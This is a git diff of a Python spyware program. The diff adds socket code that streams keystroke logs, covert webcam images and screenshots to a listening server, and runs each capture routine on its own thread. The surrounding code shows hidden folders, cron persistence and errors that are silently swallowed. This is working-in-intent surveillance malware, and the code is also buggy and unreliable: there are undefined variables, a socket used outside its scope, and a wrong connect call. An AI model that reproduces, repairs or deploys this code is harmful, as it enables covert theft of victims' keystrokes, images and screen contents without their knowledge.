@@ -1,4 +1,6 @@
 import os
+import threading
+import socket
 import cv2
 import platform
 import sys
@@ -9,63 +11,141 @@ import keyboard
 import getpass
 from crontab import CronTab
 
-class listener():
-    
-    #log keys and if there is an error pass
-    def log_keys(self):
-        try:
-            
-            os.chdir('C:\\Drivers\\network\\keylogs')
-            x = 1
-            while True:
-                if (str('logged_text' + str(x)) in str(os.listdir()) + '\\keylogs'):
-                    x += 1
-                else:
-                    #generate the text file for logging keys
-                    with open("logged_text" + str(x) + ".txt", 'w+') as file:
-                        #while the number of characters is less than 300
-                        for x in range(300):
-                            file.write(keyboard.read_key())
-                            file.write('\n')
-                        file.close()
-        except:
+def log_keys(self):
+    try:
+        
+        os.chdir('C:\\Drivers\\network\\keylogs')
+        x = 1
+        while True:
+            if (str('logged_text' + str(x)) in str(os.listdir()) + '\\keylogs'):
+                x += 1
+            else:
+                filename = "logged_text" + str(x) + ".txt"
+                
+                #generate the text file for logging keys
+                with open(filename, 'w+') as file:
+                    #while the number of characters is less than 300
+                    for x in range(300):
+                        file.write(keyboard.read_key())
+                        file.write('\n')
+                    
+                #the start of the sending, file was created above and is giogn to be sent below
 
-            pass
-    
-    #occasional screenshots of the person behind the camera of the computer
-    def camera_screenshot(self):
-        #not finished yet
-        try:
-            os.chdir('C:\\Drivers\\network\\face-screenshots')
-            x = 1
-            while True:
-                time.sleep(5)
-                if (str('image' + str(x)) in str(os.listdir()) + '\\face-screenshots'):
-                    x += 1
-                else:
-                    camera = cv2.VideoCapture(0)
-                    return_value, image = camera.read()
-                    if return_value:
-                        cv2.imwrite('image' + str(x) + '.png', image)
-                    del(camera)
-        except:
-            pass
+                #file sending code
+                if os.path.isfile(filename):
+                    #send filename
+                    face_screenshot_socket.send(filename.encode())
+                    
+                    #sending filename
+                    face_screenshot_socket.sendall(str(filename).encode())
 
-    #screenshots of the screen every .5 seconds
-    def computer_screenshot(self):
-        #not finished yet
-        os.chdir('C:\\Drivers\\network\\computer-screenshots')
-        try:
-            x = 1
-            while True:
-                time.sleep(5)
-                if ('screenshot' + str(x) in os.listdir() + '\\computer-screenshots'):
-                    x += 1
+                    #sending filesize
+                    face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
+                    
+                    with open(filename, 'rb') as f:
+                        packetAmmount = ceil(filesize/2048)
+                        for x in range(0, packetAmmount):
+                            bytesToSend = f.read(2048)
+                            face_screenshot_socket.send(bytesToSend)
+                        print("file sent!")
                 else:
-                    screenshot = pyautogui.screenshot()
-                    screenshot.save('screenshot' + str(x) + '.png')
-        except:
-            pass
+                    face_screenshot_socket.sendall('false'.encode())
+                    print("file does not exist...")
+    except:
+
+        pass
+
+#occasional screenshots of the person behind the camera of the computer
+def camera_screenshot(self):
+    #not finished yet
+    try:
+        #change directory to face screenshots folder
+        os.chdir('C:\\Drivers\\network\\face-screenshots')
+        
+        #enter the ipaddress of the listening server
+        host = '192.168.1.254' 
+        face_screenshot_port = 27654
+
+        face_screenshot_socket = socket.socket()
+        face_screenshot_socket.connect(host, face_screenshot_port)
+
+        x = 1
+        while True:
+            time.sleep(5)
+            if (str('image' + str(x)) in str(os.listdir()) + '\\face-screenshots'):
+                x += 1
+            else:
+                camera = cv2.VideoCapture(0)
+                return_value, image = camera.read()
+                if return_value:
+                    filename = 'image' + str(x) + '.png'
+                    cv2.imwrite(filename, image)
+
+                    #the start of the sending, file was created above and is giogn to be sent below
+
+                    #file sending code
+                    if os.path.isfile(filename):
+                        #send filename
+                        face_screenshot_socket.send(filename.encode())
+                        
+                        #sending filename
+                        face_screenshot_socket.sendall(str(filename).encode())
+
+                        #sending filesize
+                        face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
+                        
+                        with open(filename, 'rb') as f:
+                            packetAmmount = ceil(filesize/2048)
+                            for x in range(0, packetAmmount):
+                                bytesToSend = f.read(2048)
+                                face_screenshot_socket.send(bytesToSend)
+                            print("file sent!")
+                    else:
+                        face_screenshot_socket.sendall('false'.encode())
+                        print("file does not exist...")
+    except:
+        pass
+
+#screenshots of the screen every .5 seconds
+def computer_screenshot(self):
+    #not finished yet
+    os.chdir('C:\\Drivers\\network\\computer-screenshots')
+    try:
+        x = 1
+        while True:
+            time.sleep(5)
+            if ('screenshot' + str(x) in os.listdir() + '\\computer-screenshots'):
+                x += 1
+            else:
+                filename = 'screenshot' + str(x) + '.png'
+                screenshot = pyautogui.screenshot()
+                screenshot.save(filename)
+
+                #the start of the sending, file was created above and is giogn to be sent below
+
+                #file sending code
+                if os.path.isfile(filename):
+                    #send filename
+                    face_screenshot_socket.send(filename.encode())
+                    
+                    #sending filename
+                    face_screenshot_socket.sendall(str(filename).encode())
+
+                    #sending filesize
+                    face_screenshot_socket.sendall(str(int(os.path.getsize(filename))).encode())
+                    
+                    with open(filename, 'rb') as f:
+                        packetAmmount = ceil(filesize/2048)
+                        for x in range(0, packetAmmount):
+                            bytesToSend = f.read(2048)
+                            face_screenshot_socket.send(bytesToSend)
+                        print("file sent!")
+                else:
+                    face_screenshot_socket.sendall('false'.encode())
+                    print("file does not exist...")
+                
+    except:
+        pass
 
 
 try:
@@ -97,10 +177,14 @@ try:
         #initialize the listener object
         spy = listener()
 
-        #add the multiprocessing thing here with each function on a different process in the listener class
-        spy.camera_screenshot()
-        spy.computer_screenshot()
-        spy.log_keys()
+        #starting each process in the listener class on a different thread
+        computer_screenshot_thread = threading.Thread(target=computer_screenshot)
+        camera_screenshot_thread = threading.Thread(target=camera_screenshot)
+        log_keys_thread = threading.Thread(target=log_keys)
+
+        computer_screenshot_thread.start()
+        camera_screenshot_thread.start()
+        log_keys_thread.start()
 except:
     #in the except all of the information will be sent from the folders before doinng the sys.exit
     
